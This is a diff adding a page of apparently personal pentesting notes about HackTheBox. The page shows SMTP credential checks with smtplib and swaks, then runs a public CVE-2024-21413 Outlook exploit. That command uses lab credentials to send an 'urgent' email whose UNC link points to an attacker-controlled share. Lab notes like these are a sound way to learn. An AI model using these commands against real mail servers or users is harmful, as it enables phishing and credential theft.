@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;pre&gt;&lt;code class=&quot;language-PYTHON&quot;&gt;pythonPython 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; import smtplib&amp;gt;&amp;gt;&amp;gt; server = smtplib.SMTP(&#39;DOMAIN:587&#39;)&amp;gt;&amp;gt;&amp;gt; server.login(&#39;USER&#39;, &#39;PASSWORD&#39;)Traceback (most recent call last):  File &quot;&amp;lt;stdin&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;  File &quot;/usr/lib/python3.12/smtplib.py&quot;, line 750, in login    raise last_exception  File &quot;/usr/lib/python3.12/smtplib.py&quot;, line 739, in login    (code, resp) = self.auth(                   ^^^^^^^^^^  File &quot;/usr/lib/python3.12/smtplib.py&quot;, line 662, in auth    raise SMTPAuthenticationError(code, resp)smtplib.SMTPAuthenticationError: (535, b&#39;Authentication failed. Restarting authentication process.&#39;)&amp;gt;&amp;gt;&amp;gt; server.login(&#39;USER@DOMAIN&#39;, &#39;PASSWORD&#39;)(235, b&#39;authenticated.&#39;)&lt;/code&gt;&lt;/pre&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <pre><code class="language-PYTHON">python
+Python 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import smtplib
+&gt;&gt;&gt; server = smtplib.SMTP('DOMAIN:587')
+&gt;&gt;&gt; server.login('USER', 'PASSWORD')
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+  File "/usr/lib/python3.12/smtplib.py", line 750, in login
+    raise last_exception
+  File "/usr/lib/python3.12/smtplib.py", line 739, in login
+    (code, resp) = self.auth(
+                   ^^^^^^^^^^
+  File "/usr/lib/python3.12/smtplib.py", line 662, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'Authentication failed. Restarting authentication process.')
+&gt;&gt;&gt; server.login('USER@DOMAIN', 'PASSWORD')
+(235, b'authenticated.')
+</code></pre>
+
+<pre><code class="language-BASH">swaks --auth-user 'USER@DOMAIN' --auth LOGIN --auth-password PASSWORD --quit-after AUTH --server DOMAIN
+</code></pre>
+
+<p>CVE-2024-21413</p>
+<pre><code class="language-BASH">git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+
+python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.6\share\sploit" --subject "Check this out ASAP!"
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
